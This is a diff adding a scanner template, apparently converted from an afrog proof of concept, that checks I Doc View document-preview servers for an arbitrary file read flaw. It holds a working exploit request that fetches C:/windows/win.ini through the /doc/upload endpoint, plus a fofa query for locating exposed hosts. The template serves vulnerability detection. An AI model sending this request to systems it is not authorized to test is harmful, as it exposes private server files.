@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"srcUrl":'
+          - '"/data/test/'
+          - '"ext":'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt'
+id: idocview-fileread
+info:
+  author: Wen
+  description: 'fofa: title=="在线文档预览 - I Doc View"'
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: I Doc View任意文件读取漏洞
+  severity: high
+  tags: idocview,fileread,argus-import
